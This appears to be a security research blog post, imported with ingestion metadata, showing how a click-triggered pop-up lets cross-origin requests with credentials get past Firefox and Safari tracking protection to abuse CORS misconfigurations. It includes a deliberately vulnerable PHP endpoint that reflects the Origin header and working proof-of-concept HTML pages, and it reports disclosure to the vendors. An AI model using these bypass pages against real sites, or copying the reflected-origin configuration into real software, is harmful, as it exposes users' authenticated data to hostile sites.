---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-25_bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse.md
original_filename: 2024-01-25_bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse.md
title: Bypassing browser tracking protection for CORS misconfiguration abuse
category: documents
detected_topics:
- cors
- mobile-security
- sso
- xss
- command-injection
- mfa
tags:
- imported
- documents
- cors
- mobile-security
- sso
- xss
- command-injection
- mfa
language: en
raw_sha256: 942f29177251dbe26d7818804c127aa1bd324451206f3fadceb09481e067cbd6
text_sha256: 62de11686815a66703f317bd52a6316fbaa0239131e81c15a7e81d6d35be647e
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing browser tracking protection for CORS misconfiguration abuse

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-25_bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse.md
- Source Type: markdown
- Detected Topics: cors, mobile-security, sso, xss, command-injection, mfa
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `942f29177251dbe26d7818804c127aa1bd324451206f3fadceb09481e067cbd6`
- Text SHA256: `62de11686815a66703f317bd52a6316fbaa0239131e81c15a7e81d6d35be647e`


## Content

---
title: "Bypassing browser tracking protection for CORS misconfiguration abuse"
page_title: "Bypassing browser tracking protection for CORS misconfiguration abuse – PT SWARM"
url: "https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/"
final_url: "https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/"
authors: ["Nikita Sveshnikov"]
programs: ["Mozilla (Firefox)", "Apple (Safari)"]
bugs: ["CORS misconfiguration", "Browser hacking"]
publication_date: "2024-01-25"
added_date: "2024-01-29"
source: "pentester.land/writeups.json"
original_index: 497
---

# Bypassing browser tracking protection for CORS misconfiguration abuse

Written by [Nikita Sveshnikov](https://swarm.ptsecurity.com/author/nikita-sveshnikov/ "Posts by Nikita Sveshnikov") on January 25, 2024

## Author

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/65416255-Photo-150x150.jpg)

[Nikita Sveshnikov](https://swarm.ptsecurity.com/author/nikita-sveshnikov/ "Posts by Nikita Sveshnikov")

Web Application Security Expert 

Cross-Origin Resource Sharing (CORS) is a web protocol that outlines how a web application on one domain can access resources from a server on a different domain. By default, web browsers have a Same-Origin Policy (SOP) that blocks these cross-origin requests for security purposes. However, CORS offers a secure way for servers to specify which origins are allowed to access their assets, thereby enabling a structured method of relaxing this policy.

In CORS, the server sends HTTP headers to instruct the browser on rules for making cross-origin requests. These rules define whether a particular HTTP request (such as GET or POST) from a certain origin is allowed. By managing the CORS headers, a server can control its resource accessibility on a case-by-case basis. This maintains the flexibility of cross-origin sharing without compromising overall security.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/6cdedf8d-cors.png) Figure 1. A “Simple” cross-origin request

CORS uses specific HTTP headers to control access to resources. Here are a few examples:

  * `Access-Control-Allow-Origin`: This header specifies the origin that is allowed to access the resource. The value can be a specific domain (e.g., https://example.com) or a wildcard (`*`) allowing any domain.
  * `Access-Control-Allow-Methods`: This header defines the HTTP methods (such as `GET`, `POST`, and `DELETE`) allowed when accessing the resource. The value is a comma-separated list of methods (for example, `GET, POST, DELETE`).
  * `Access-Control-Allow-Credentials`: This header indicates whether or not the response to the request can be exposed when the credentials flag is true. If used, it must be set to `true`.

While there are other headers available, this article will focus specifically on `Access-Control-Allow-Credentials`.

Proper header handling is crucial for secure and accurate CORS functionality. Improper configuration can lead to serious security vulnerabilities, enabling attackers to bypass the Same Origin Policy (SOP) and perform various potential attacks.

  * **Insecure`Access-Control-Allow-Origin`**: If a site uses a wildcard `*` as the value for `Access-Control-Allow-Origin`, it allows any domain to make cross-origin requests. In the same way, dynamically reflecting the `Origin` header value can create security vulnerabilities. This misconfiguration can be used to access sensitive data from a website.
  * **Improper use of`Access-Control-Allow-Credentials`**: Setting `Access-Control-Allow-Credentials` to `true` allows the frontend JavaScript to access the response when the request’s credentials mode is set to `include`. However, this can lead to data leaks if combined with a misconfigured `Access-Control-Allow-Origin` header.

There are more vulnerabilities associated with CORS misconfigurations. You can learn more about this at [PortSwigger’s CORS page](https://portswigger.net/web-security/cors). However, it’s important to note that some changes in browsers have occurred since those articles were written. These changes have also affected the exploitation of CORS misconfiguration vulnerabilities. According to the guides, it is possible to access `vulnerable-website.com` from `malicious-website.com` using credentials, if the vulnerable service returns the headers `Access-Control-Allow-Origin: https://malicious-website.com` and A`ccess-Control-Allow-Credentials: true`. While you may be able to complete a PortSwigger lab, it is because the exploit server and the vulnerable site are on the same root domain. It’s unlikely that you’ll be able to do this from a different root domain. This article will explain the reasons behind this.

## Updates in browser security mechanisms

Chrome’s recent change in default settings has further impacted the exploitation of CORS misconfigurations. Specifically, Chrome now defaults the `SameSite` attribute of cookies to `Lax`, which limits cookies to same-site requests or `GET` requests for top-level navigation. This means that in Chrome, it’s no longer possible to send a cross-origin request with a cookie from a different root domain. Consequently, subdomain takeover or XSS attacks have become the primary methods of exploiting CORS misconfigurations.

It’s important to note that not all web browsers have implemented the same cookie security measures. Firefox and Safari have chosen different approaches to restrict cookie transmission in cross-origin requests. To understand how CORS works in various browser contexts and to explore ways to bypass its defense mechanisms, this article will create a simulated environment that illustrates the intricacies of CORS behavior across different browsers.

## Setting up the lab: a sandbox for CORS interactions

Our lab consists of three domains:

  * `attack-cors.worksh0p.repl.co`: This domain hosts an `index.html` file and will be used to initiate cross-origin requests.
  * `same-site.nicksv.com`: This is a site with the same root domain as `vuln-cors.nicksv.com`. It mirrors `attack-cors.worksh0p.repl.co` in hosting an `index.html` file for cross-origin requests to `vuln-cors.nicksv.com`.
  * `vuln-cors.nicksv.com`: With an intentional CORS misconfiguration, this domain serves as a potential target for exploitation. It hosts `index.php`, which returns data if a cookie is present and gives a 401 error otherwise, and `auth.php`, which sets a cookie and redirects to `index.php`.

All domains are currently accessible online and open to testing. To test using Replit, simply fork the project at <https://replit.com/@worksh0p/Attack-Cors>.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/a7486b1a-figure-1.png) Figure 2. Architecture of the simulated environment

We will use the following domains to demonstrate and study the following scenarios:

  * How browsers handle cross-origin requests to a different root domain (`attack-cors.worksh0p.repl.co` to `vuln-cors.nicksv.com`)
  * How browsers handle cross-origin requests to a different subdomain of the same root domain (same-site.nicksv.com to vuln-cors.nicksv.com)
  * How a CORS misconfiguration on a server (`vuln-cors.nicksv.com`) can be exploited in modern browsers

index.php:
  
  
  <?php
  if (isset($_SERVER['HTTP_ORIGIN'])) {
  header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
  }
  
  header("Access-Control-Allow-Credentials: true");
  header("Content-Type: application/json");
  
  function getCookie($name) {
  if (isset($_COOKIE[$name])) {
  return $_COOKIE[$name];
  } else {
  return false;
  }
  }
  
  $cookieName = 'test';
  
  $cookieValue = getCookie($cookieName);
  
  if ($cookieValue === false) {
  http_response_code(401);
  echo json_encode(['message' => 'Unauthorized access: No cookie found']);
  } else {
  $response = array(
  "message" => "Cookie value found",
  "cookie" => $cookieValue
  );
  
  $jsonResponse = json_encode($response);
  
  echo $jsonResponse;
  }
  ?>

auth.php:
  
  
  <?php
  function createCookie($name, $value, $expiryTime, $path) {
  setcookie($name, $value, time() + $expiryTime, $path);
  }
  
  $randomValue = md5(uniqid());
  createCookie('test', $randomValue, 3600, '/');
  
  header('Location: index.php');
  exit;
  ?>

index.html:
  
  
  <!DOCTYPE html>
  <html>
  
  <head>
  <title>Cross-origin request Page</title>
  <script>
  function handleCorsRequest(type) {
  let url = "https://vuln-cors.nicksv.com";
  let options = {
  method: "GET",
  mode: "cors",
  };
  
  if (type === "withCredentials") {
  options.credentials = "include";
  }
  
  fetch(url, options)
  .then(response => {
  if (!response.ok) {
  throw new Error(`HTTP error! status: ${response.status}`);
  }
  return response.json();
  })
  .then(data => {
  document.getElementById(`message-${type}`).textContent = 'Request succeeded with JSON response: ' + JSON.stringify(data);
  })
  .catch(error => {
  document.getElementById(`message-${type}`).textContent = 'Request failed: ' + error.message;
  });
  }
  </script>
  </head>
  
  <body>
  <div id="main-container">
  <div id="buttons-container">
  <button onclick="handleCorsRequest('noCredentials')">Cross-origin request Without Credentials</button>
  <button onclick="handleCorsRequest('withCredentials')">Cross-origin request With Credentials</button>
  </div>
  <div id="results-container">
  <div id="message-noCredentials" class="message"></div>
  <div id="message-withCredentials" class="message"></div>
  </div>
  </div>
  </body>
  
  </html>

## Tracking protection in Firefox and Safari

According to statistics from Statcounter in October 2023, Firefox commands 3.06% of the desktop browser market, while Safari commands 19.91%.

### Firefox: Enhanced Tracking Protection

Mozilla first introduced Tracking Protection in Firefox with the release of Firefox 42 in November 2015. It aimed to protect user privacy by blocking web content from known trackers provided by Disconnect, a privacy-focused company. However, this feature was not enabled by default and only worked in private browsing mode.

The feature received a significant upgrade with the launch of Firefox 69 in September 2019. This upgrade, called Enhanced Tracking Protection (ETP), was enabled by default for all users. ETP takes a more proactive approach to protecting user privacy by automatically blocking third-party tracking cookies. It also provides an option to block fingerprints (trackers that identify and track users based on their device configuration).

Despite these developments, cross-origin requests with credentials continued to operate as normal, and exploitation of misconfiguration was not considered a significant problem. However, this changed with the introduction of Firefox 103.

[![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/e518c2fa-Untitled.png)](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/e518c2fa-Untitled.png)Figure 3. Part of the changelog

After that, cookies were only sent if the resources shared the same root domain.

The ETP icon is located in the URL bar on the left of the SSL icon and looks like a shield.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/f1c5896f-Untitled-1.png) Figure 4. The ETP information window

ETP has additional settings including exceptions and protection templates.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/408aeae2-Untitled-2.png) Figure 5. ETP settings

Let’s perform a cross-origin request from `same-site.nicksv.com` to `vuln-cors.nicksv.com`. Since these sites share the same root domain, the browser’s ETP allows this request to include cookies. As shown in figure 6, the request successfully carries the cookie, and the server responds as expected.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/d2a55bc4-Untitled-3.png) Figure 6. Results of cross-origin requests from same-site.nicksv.com ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/06f86c16-Figure-3.png) Figure 7. The interaction scheme for cross-origin requests from the same root domain with ETP enabled

Next, we will perform a cross-origin request from `attack-cors.worksh0p.repl.co` to `vuln-cors.nicksv.com`. In this case, the domains do not share the same root. ETP should prevent this request from carrying cookies. As you can see in the following screenshot, the request proceeds without the cookie, indicating that ETP has functioned as intended.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/e936b97e-Untitled-4.png) Figure 8. ETP prevented the browser from placing a cookie in the request and sent the request without it ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/c9075a23-Figure-2.png) Figure 9. The interaction scheme for cross-origin requests between different root domains with ETP enabled

To further emphasize the effect of ETP on cross-origin requests, we’ll disable ETP and rerun the cross-origin request from `attack-cors.w0rkshop.repl.co` to `vuln-cors.nicksv.com`. Now, the previously cookie-less cross-origin request should carry the cookie.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/01aa0ee6-Untitled-5.png) Figure 10. When ETP is disabled, the browser includes a cookie in the request ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/10d50cfe-Figure-4.png) Figure 11. The interaction scheme for cross-origin requests working between different root domains with disabled ETP

### Safari: Intelligent Tracking Prevention

Apple, on the other hand, introduced its defense mechanism against cross-site tracking with the release of Safari 11 in September 2017. This feature, named Intelligent Tracking Prevention (ITP), uses machine learning algorithms to identify and block trackers that attempt to access a user’s cookies across multiple sites.

Initially, ITP was not enabled by default and users had to manually turn on the “Prevent cross-site tracking” option in settings. However, with the rollout of Safari 12.1 in March 2019, ITP was enabled by default. Furthermore, Apple has continued to update and improve ITP, making it more effective at combating different forms of cross-site tracking.

Typically, it’s enabled by default in Safari 17, but there are some rare exceptions.

ITP settings are located on the Privacy tab in Safari settings.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/732bdc9f-Untitled-6.png) Figure 12. The Safari privacy settings window

Unfortunately, there is no default icon for this feature. However, we can add the “Privacy Report” option to the Customize Toolbar. Note that the icon for this option is static, so to see whether the function is enabled, you will need to click on it.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/9e08bdea-Untitled-7.png) Figure 13. ITP is enabled ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/3f4eabd4-Untitled-8.png) Figure 14. ITP is disabled

Now, with ITP enabled, let’s execute a cross-origin request from `same-site.nicksv.com` to `vuln-cors.nicksv.com`. As these domains share the same root domain, ITP should allow this request to include cookies. As shown in figure 15, the request successfully includes the cookie and receives a response from the server.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/47a1c383-Untitled-9.png) Figure 15. Results of cross-origin requests from same-site.nicksv.com

Following this, let’s perform a cross-origin request from `attack-cors.worksh0p.repl.co` to `vuln-cors.nicksv.com`. As these domains don’t share the same root, the Safari ITP policy should prevent this request from carrying cookies. As you can see in the following screenshot, the request proceeds without the cookie, demonstrating ITP’s intervention in this scenario.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/80f9dbfa-Untitled-10.png) Figure 16. ITP prevented the browser from placing a cookie in the request and sent the request without it

To further underscore the effect of ITP on cross-origin requests, we’ll disable ITP and reattempt the cross-origin request from `attack-cors.worksh0p.repl.co` to `vuln-cors.nicksv.com`. As shown in the following screenshot, the request includes the cookie and receives a response from the server.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/514a63dd-Untitled-11.png) Figure 17. When ITP is disabled, the browser places a cookie in the request

As we can see, the result of the tracking protection mechanism in Safari is the same as in Firefox. Therefore, the schemes presented in the previous section are also suitable for Safari.

## Bypassing tracking protection

### Firefox

Let’s start with Firefox.

How can we bypass this tracking protection? Our colleague and experienced researcher [Igor Sak-Sakovskiy](https://twitter.com/Psych0tr1a) has suggested a technique that involves using a user-initiated action to open a new tab and then performing a cross-origin request with credentials.

But why does this work? To find the answer to this question, I had to do the unthinkable – consult the Firefox documentation. There I found the following in the “Storage access heuristics” section of the [“Opener Heuristics”](https://developer.mozilla.org/en-US/docs/Web/Privacy/State_Partitioning#opener_heuristics) part:

  * When a partitioned third-party opens a pop-up window that has opener access to the originating document, the third-party is granted storage access to its embedder for 30 days.
  * When a first-party `a.example` opens a third-party pop-up `b.example`, `b.example` is granted third-party storage access to `a.example` for 30 days.

Here’s our POC:

bypass.html:
  
  
  <body>
  <p>Click anywhere on this page to trigger the Cross-origin request.</p>
  <div id="response"></div>
  
  <script>
  document.addEventListener("DOMContentLoaded", () => {
  document.onclick = () => {
  open('https://vuln-cors.nicksv.com/');
  
  fetch('https://vuln-cors.nicksv.com/', {
  method: 'GET',
  credentials: 'include',
  mode: 'cors'
  })
  .then(response => response.json())
  .then(data => {
  document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
  })
  .catch(error => {
  console.log('Failed to issue Cross-origin request');
  });
  }
  });
  </script>
  </body>

When the user clicks anywhere on the webpage, a script opens `vuln-cors.nicksv.com` in a new tab. Assuming `attack-cors.worksh0p.repl.co` is the first-party site (the site the user is directly interacting with), and `vuln-cors.nicksv.com` is a third-party site opened through this user interaction, it will be granted storage access for 30 days because it was opened as a pop-up window or in a new tab.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/f5d958aa-Untitled-12.png) Figure 18. The cross-origin request in Firefox is successful

This means that for the next 30 days you don’t need to bypass tracking protection again in order to send cookies.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/e85fd8c2-Untitled-13.png) Figure 19. ETP in Firefox allows a cookie to be sent in a request

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/b59b8da5-Figure-5.png) Figure 20. The scheme of how to bypass tracking protection

### Safari

To bypass ITP in Safari, we will need to slightly modify the bypass script. Let’s add a two-second timeout before the cross-origin request. Otherwise, it may be unstable.

safari.html:
  
  
  <body>
  <p>Click anywhere on this page to trigger the CORS request.</p>
  <div id="response"></div>
  
  <script>
  document.addEventListener("DOMContentLoaded", () => {
  document.onclick = () => {
  open('https://vuln-cors.nicksv.com/');
  
  setTimeout(() => {
  fetch('https://vuln-cors.nicksv.com/', {
  method: 'GET',
  credentials: 'include',
  mode: 'cors'
  })
  .then(response => response.json())
  .then(data => {
  document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
  })
  .catch(error => {
  console.log('Failed to issue Cross-origin Request');
  });
  }, 2000);
  }
  });
  </script>
  </body>

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/29b9f76a-Untitled-14.png) Figure 21. The cross-origin request in Safari is successful

**Important.** The process above is described for the last Safari 17 on macOS Sonoma. However, this study was originally conducted several months prior with Safari 16 on macOS Ventura, which had quite a different process of bypassing the protection. To bypass ITP in Safari 16, the user had to not only click on the `safari.html` page, but also click on the opened page (`vuln-cors.nicksv.com`). Only then were cookies inserted into the cross-origin request. Luckily, the latest version of the browser only requires one click.

### Report to vendors

Both Mozilla and Apple were notified about the possibility of bypassing tracking protection. Firefox developers acknowledged this behavior. They noted that this was a known and documented aspect of the browser’s functionality. Apple didn’t provide a response.

## A brief look at mobile browsers

Considering that over 55% of website traffic comes from mobile devices, let’s have a look at how things are going there.  
Let’s begin with Android devices. As expected, Chrome on Android works in a similar way to the desktop version. I choose Firefox as another target.  
The Android version also has ETP built in and enabled by default. However, unlike the desktop version, it does not affect our cross-origin request and allows us to execute it with credentials from another root domain without bypasses.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/a65e34fc-andoridfox.png) Figure 22. Firefox on Android Device

Now let’s take a look at Apple’s mobile device. All iOS browsers run on WebKit, meaning Safari, Google Chrome, or any other browser should behave almost identically.

In Safari settings the option is called “Prevent Cross-Site Tracking” and in Chrome settings there is an option called “Allow Cross-Website Tracking”. In both browsers, the security features are enabled by default.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/4f49b81c-settings.png) Figure 23. iOS Safari and Chrome settings

On this platform, the trackers do their job and we are unable to make a cross-origin request with cookies. Bypasses from desktop browsers won’t work, but the two-click method we mentioned earlier will do the trick.

Interestingly, during our research, we found that an iOS 16 device required one click, while iOS 15 and 17 devices required two clicks. There were also slight differences between Safari and Chrome, despite the fact that they both run on the same engine.

For a successful repeatable demonstration, let’s create a new `button.html` page at `vuln-cors.nicksv.com`. This is because mobile browsers often do not count tapping on a blank screen or text on our example site as a second click. For this reason, I made a simple page with a button that changes the label text.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/947f821c-settings-1.png) Figure 24. Web page button.html

Let’s edit our safari.html script a bit and save it under a new name – `webkit.html`. When clicked, it will open `https://vuln-cors.nicksv.com/button.html`. Let’s also increase the timeout for a cross-origin request to three seconds.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/057494e7-Figure-8.png) Figure 25. The scheme of how to bypass tracking protection in WebKit ![](https://swarm.ptsecurity.com/wp-content/uploads/2024/01/b8be1626-results.png) Figure 26. Test results

We are able to run cross-origin requests from another domain with credentials on both browsers and get the data.

## Conclusion

In this deep dive, we have explored how CORS works across different web browsers and how certain misconfigurations can be exploited despite the built-in anti-tracking mechanisms. Since such tracking protection behavior is necessary for the functionality of certain web apps, we can expect that this method will continue to work in the future.

All code can be found on GitHub <https://github.com/nicksvv/BypassTrackingProtection>.

Special thanks to Alexander Minin. This research wouldn’t have happened without him.

[Web Application Security](https://swarm.ptsecurity.com/tag/web-application-security/)
